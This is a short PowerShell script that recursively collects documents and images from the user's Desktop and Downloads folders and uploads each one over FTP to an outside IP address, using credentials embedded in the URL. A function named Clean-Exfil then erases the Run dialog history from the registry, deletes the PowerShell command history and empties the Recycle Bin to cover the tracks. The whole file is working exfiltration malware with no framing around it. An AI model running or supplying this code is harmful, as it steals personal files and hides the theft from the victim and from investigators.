$WebClient = New-Object System.Net.WebClient
$Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads"
$FTP = "ftp://testadmin:testpassword@192.119.71.89/files/"


foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse)){
    $URI = New-Object System.Uri($FTP+$item.Name)
    $WebClient.UploadFile($URI, $item.FullName)
}
function Clean-Exfil{
    reg delete HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Explorer\RunMRU /va /f
    Remove-Item (Get-PSreadlineOption).HistorySavePath
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
Clean-Exfil
